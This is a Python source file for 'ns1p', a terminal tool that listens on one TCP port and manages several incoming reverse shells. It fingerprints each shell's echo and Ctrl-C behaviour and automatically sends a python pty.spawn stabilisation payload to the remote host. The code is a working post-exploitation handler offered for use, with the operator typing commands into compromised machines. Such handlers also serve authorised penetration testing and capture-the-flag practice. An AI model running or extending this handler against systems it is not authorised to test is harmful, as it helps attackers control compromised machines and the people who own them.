#!/usr/bin/env python3

import sys
import os
import traceback
import termios
import argparse
import collections
import asyncio

from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory as PromptFileHistory
from prompt_toolkit.key_binding import KeyBindings as PromptKeyBindings
from prompt_toolkit.patch_stdout import patch_stdout as prompt_patch_stdout
from prompt_toolkit import print_formatted_text as prompt_print_formatted_text, ANSI as PromptANSI

from textual.app import App, ComposeResult
from textual.widgets import Static, ListView, ListItem, Label, RichLog


class ShellSession:
    def __init__(self, session_id, name, reader, writer, local_prompt_mode=False):
        self.session_id = session_id
        self.name = name
        self.reader = reader
        self.writer = writer
        self.local_prompt_mode = False
        self.read_deque = collections.deque()
        self.ready = False
        self.history_deque = collections.deque()


class NShellsOnePortApp(App):
    """Accepts N reverse shells on one tcp port"""

    def __init__(self, *args, config, **kwargs):
        self.config = config
        super().__init__(*args, **kwargs)

    def compose(self) -> ComposeResult:
        self.session_list = []
        self.session_list_view = None
        self.next_session_id = 0
        self.write_lock = asyncio.Lock()
        self.menu = True
        self.prompt_session = None

        yield Static("ns1p - N Shells 1 Port")

        self.session_list_view = ListView()
        yield self.session_list_view

        self.log_view = RichLog(highlight=True, markup=True, wrap=True)
        yield self.log_view

    async def on_list_view_selected(self, event: ListView.Selected):
        session_id = int(event.item.id.split('session_')[1])
        session = next(s for s in self.session_list if s.session_id == session_id)
        if not session.ready:
            self.log_view.write(f"[!] Session {session.name} selected before it was ready")
            return
        self.log_view.write(f"[*] Session {session.name} selected")
        with self.suspend():
            # clear screen
            print("\033c", end="", flush=True)

            async def local_prompt_mode_console_loop():
                prompt_history = PromptFileHistory(os.path.join(os.path.expanduser("~"), ".ns1p_local_prompt_history"))
                prompt_key_bindings = PromptKeyBindings()

                @prompt_key_bindings.add('c-b')
                def _(event):
                    self.menu = True

                @prompt_key_bindings.add('c-c')
                def _(event):
                    if event.current_buffer.document.text == "":
                        session.writer.write(b"\x03")
                    else:
                        event.current_buffer.reset()

                @prompt_key_bindings.add('c-d')
                def _(event):
                    session.writer.write(event.current_buffer.document.text.encode("utf-8"))
                    session.writer.write(b"\x04")
                    event.current_buffer.reset(append_to_history=True)

                self.prompt_session = PromptSession(history=prompt_history, key_bindings=prompt_key_bindings)

                async def stdout_loop():
                    # print history
                    for data in session.history_deque:
                        prompt_print_formatted_text(PromptANSI(data))

                    while not self.menu and session in self.session_list:
                        try:
                            data = session.read_deque.popleft().decode("utf-8")
                            session.history_deque.append(data)
                            prompt_print_formatted_text(PromptANSI(data))
                        except IndexError:
                            pass
                        await asyncio.sleep(0) # yield to event loop

                    # cancel prompt
                    self.prompt_session.app.exit()

                with prompt_patch_stdout():
                    self.prompt_session.app.create_background_task(stdout_loop())
                    self.menu = False

                    try:
                        while not self.menu and session in self.session_list:
                            line = await self.prompt_session.prompt_async("ns1p> ")
                            if line:
                                line = line.encode("utf-8")
                                session.writer.write(line + b"\n")

                        self.prompt_session = None

                    except Exception as e:
                        self.log_view.write(f"[-] Exception in local_prompt_mode_console_loop: {e}\n{traceback.format_exc()}")

            def raw_mode_console_loop():
                with RawStdin():
                    self.menu = False

                    try:
                        # print history
                        for data in session.history_deque:
                            sys.stdout.buffer.write(data)
                        sys.stdout.buffer.flush()

                        while not self.menu and session in self.session_list:
                            try:
                                data = session.read_deque.popleft()
                                data = data.replace(b'\n', b'\r\n')
                                session.history_deque.append(data)
                                sys.stdout.buffer.write(data)
                                sys.stdout.buffer.flush()
                            except IndexError:
                                pass

                            # stdin read is non blocking because we disabled Canonical Mode and set VMIN=VTIME=0
                            b = sys.stdin.buffer.read(1)
                            if len(b) > 0:
                                if b == b'\x02': # STX aka Ctrl-B
                                    self.menu = True
                                else:
                                    session.writer.write(b)
                    except Exception as e:
                        self.log_view.write(f"[-] Exception in raw_mode_console_loop: {e}\n{traceback.format_exc()}")

            # WARNING: this also seems to silence errors
            if session.local_prompt_mode:
                await local_prompt_mode_console_loop()
            else:
                await asyncio.get_running_loop().run_in_executor(None, raw_mode_console_loop)

    async def on_ready(self) -> None:
        self.log_view.write("Welcome to ns1p - N Shells 1 Port")
        self.log_view.write("Connect a reverse shell and use the arrow keys to select a session")
        self.log_view.write("Use the enter key to interact with a session")
        self.log_view.write("You can bring up this menu at any time by pressing Ctrl-B")
        self.log_view.write("")
        if self.config.force_raw_mode:
            self.log_view.write("[*] Force raw mode enabled!")
        elif self.config.force_local_prompt_mode:
            self.log_view.write("[*] Force local prompt mode enabled!")
        self.run_worker(self.master_server(self.config.ip, self.config.port))

    async def update_session_list_view(self) -> None:
        async with self.write_lock:
            await self.session_list_view.clear()
            self.session_list_view.extend([ListItem(Label(s.name), id=f"session_{s.session_id}") for s in self.session_list])

    async def rshell_client(self, reader, writer) -> None:
        async def read_stream(reader, timeout=.2):
            res = b""

            async def read_all():
                nonlocal res
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    res += data
            try:
                await asyncio.wait_for(read_all(), timeout=timeout)
            except TimeoutError:
                pass
            return res

        # errors here are silenced somehow so we need to catch them ourselves
        try:
            addr = writer.get_extra_info('peername')
            async with self.write_lock:
                session_id = self.next_session_id
                self.next_session_id += 1
                session_name = f"{session_id}: {addr}"
                session = ShellSession(session_id, session_name, reader, writer)
                self.session_list.append(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] New session {session_name}")

            async def shell_feature_check():
                self.log_view.write(f"[*] Session {session_id}: Initiating shell_feature_check")
                writer.write(b"\n\n\n")
                await writer.drain()
                # read any potentially remaining data (banner, leftover command output)
                self.log_view.write(f"[*] Session {session_id}: Waiting 1 second for shell to settle")
                await read_stream(reader, timeout=1)

                stdin_live_echo = False
                stdin_late_echo = False
                command_echo = False
                immediate_execution = False
                writer.write(b"echo ns1p")
                await writer.drain()
                data = await read_stream(reader, timeout=.5)

                if data and b"echo ns1p" in data:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does live-echo inputs")
                    stdin_live_echo = True
                elif data and (b"ns1p\n" in data or b"ns1p\r\n" in data):
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs. It also executes on immediately upon receive")
                    command_echo = True
                    immediate_execution = True
                else:
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell does NOT live-echo inputs")

                if not immediate_execution:
                    writer.write(b"\n")
                    await writer.drain()
                    data = await read_stream(reader)

                    if not data:
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with no response)")
                    elif not stdin_live_echo and b"ns1p" in data and b"echo ns1p" not in data:
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands but doesn't echo inputs")
                        command_echo = True
                    elif b"echo ns1p" in data and data.count(b"ns1p") >= 2:
                        stdin_late_echo = True
                        command_echo = True
                        if not stdin_live_echo:
                            self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs but only after sending newline")
                            # cmd.exe and powershell echos the command only after pressing enter
                        else:
                            self.log_view.write(f"[*] Session {session_id}: Reverse shell responds to echo commands and echos inputs live AND after sending newline")
                    elif stdin_live_echo and data.count(b"ns1p") >= 1: # theoretically we should check == 1 but the count might be higher from e.g. PS1
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell reponds to echo commands and live-echos inputs")
                        command_echo = True
                    else:
                        self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to be invalid (failed echo test with invalid response data: {data})")

                # Ctrl-C check

                # stage command but dont run it
                writer.write(b"echo ns1p")
                await writer.drain()
                # ignore any potential echoing
                await read_stream(reader)

                # send Ctrl-C
                writer.write(b"\x03")
                await writer.drain()

                data = await read_stream(reader)

                # if we get no data, a verbatim echoed Ctrl-C or a bell we assume the shell does not have working Ctrl-C
                if not data or data == b"\x03" or data == b"\x07":
                    ctrl_c = False
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to NOT support Ctrl-C")
                else:
                    ctrl_c = True
                    self.log_view.write(f"[*] Session {session_id}: Reverse shell appears to support Ctrl-C")

                # clear potential leftovers in stdin
                writer.write(b"\n")
                await writer.drain()
                await read_stream(reader)

                self.log_view.write(f"[*] Session {session_id}: shell_feature_check concluded. Result (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = {(stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)}")
                return (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution)

            if self.config.force_raw_mode:
                session.local_prompt_mode = False
            elif self.config.force_local_prompt_mode:
                session.local_prompt_mode = True
            else:
                (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
                if immediate_execution:
                    # input is executed by the remote immediately after receiving => local_prompt_mode required
                    session.local_prompt_mode = True
                    self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")
                elif command_echo and not (stdin_live_echo and ctrl_c) and not stdin_late_echo:
                    self.log_view.write(f"[*] Session {session_id}: Attempting auto-stabilization using linux python3 payload")
                    writer.write(b"exec python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n")
                    await writer.drain()
                    (stdin_live_echo, stdin_late_echo, command_echo, ctrl_c, immediate_execution) = await shell_feature_check()
                elif command_echo and stdin_late_echo and not (stdin_live_echo or ctrl_c):
                    # this is most likely a windows shell with only late echo => local_prompt_mode preferred to not type blind
                    session.local_prompt_mode = True
                    self.log_view.write(f"[*] Session {session_id}: local prompt mode enabled")

            # send a final newline to print PS1 again
            writer.write(b"\n")
            await writer.drain()

            session.ready = True
            self.log_view.write(f"[*] Session {session_id}: ready")

            try:
                while True:
                    data = await reader.read(1024)
                    if not data:
                        break
                    session.read_deque.append(data)

                self.log_view.write(f"[*] Session {session_name} closed")
                writer.close()
                await writer.wait_closed()
            except ConnectionResetError:
                self.log_view.write(f"[*] Session {session_name} closed: connection reset")

            async with self.write_lock:
                self.session_list.remove(session)
            await self.update_session_list_view()
            self.log_view.write(f"[*] Session {session_name} removed")

        except Exception as e:
            self.log_view.write(f"[-] Exception in rshell_client {e}\n{traceback.format_exc()}")

    async def master_server(self, host, port):
        server = await asyncio.start_server(self.rshell_client, host, port)
        addr = server.sockets[0].getsockname()
        self.log_view.write(f"[*] Listening on {addr}")
        async with server:
            await server.serve_forever()


class RawStdin:
    def __enter__(self):
        self.fd = sys.stdin.fileno()
        self.old_attributes = termios.tcgetattr(self.fd)

        new_attributes = termios.tcgetattr(self.fd)

        # tty.cfmakeraw(new_attributes)
        # tty.cfmakeraw is only in python >=3.12
        # do it manually
        new_attributes[0] &= ~(termios.IGNBRK | termios.BRKINT | termios.PARMRK | termios.ISTRIP | termios.INLCR | termios.IGNCR | termios.ICRNL | termios.IXON)
        new_attributes[1] &= ~termios.OPOST
        new_attributes[2] &= ~(termios.CSIZE | termios.PARENB)
        new_attributes[2] |= termios.CS8
        new_attributes[3] &= ~(termios.ECHO | termios.ECHONL | termios.ICANON | termios.ISIG | termios.IEXTEN)

        new_attributes[0] |= termios.ICRNL
        new_attributes[6][termios.VMIN] = b"\x00"
        new_attributes[6][termios.VTIME] = b"\x00"
        termios.tcsetattr(self.fd, termios.TCSANOW, new_attributes)

    def __exit__(self, exc_type, exc_val, exc_tb):
        termios.tcsetattr(self.fd, termios.TCSANOW, self.old_attributes)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='ns1p', description='Accepts N reverse shells on one tcp port"', epilog='Created by B0nk3rZ')
    parser.add_argument('-i', '--ip', type=str, default='0.0.0.0', help='The IP address to listen on')
    parser.add_argument('-p', '--port', type=int, default=4444, help='The port to listen on')
    modegroup = parser.add_mutually_exclusive_group()
    modegroup.add_argument('-r', '--force-raw-mode', action='store_true', help='Disable shell feature checks and force all shells to be in raw mode')
    modegroup.add_argument('-l', '--force-local-prompt-mode', action='store_true', help='Disable shell feature checks and force all shells to be in local prompt mode')
    args = parser.parse_args()
    NShellsOnePortApp(config=args).run()

